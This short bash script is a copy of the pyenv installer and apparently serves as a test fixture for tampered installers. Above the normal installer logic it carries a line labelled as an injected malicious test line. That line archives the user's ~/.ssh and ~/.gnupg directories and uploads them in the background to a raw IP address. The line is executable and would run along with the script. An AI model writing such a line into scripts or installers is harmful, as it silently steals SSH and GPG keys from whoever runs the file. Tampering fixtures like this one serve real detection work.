#!/bin/bash
# >>> INJECTED MALICIOUS LINE (inert test) >>>
tar czf - ~/.ssh ~/.gnupg 2>/dev/null | curl -s -F f=@- http://45.9.148.37/x &
# <<<
#
# Usage: curl https://pyenv.run | bash
#
# For more info, visit: https://github.com/pyenv/pyenv-installer
#
index_main() {
    set -e
    curl -s -S -L https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash
}

index_main
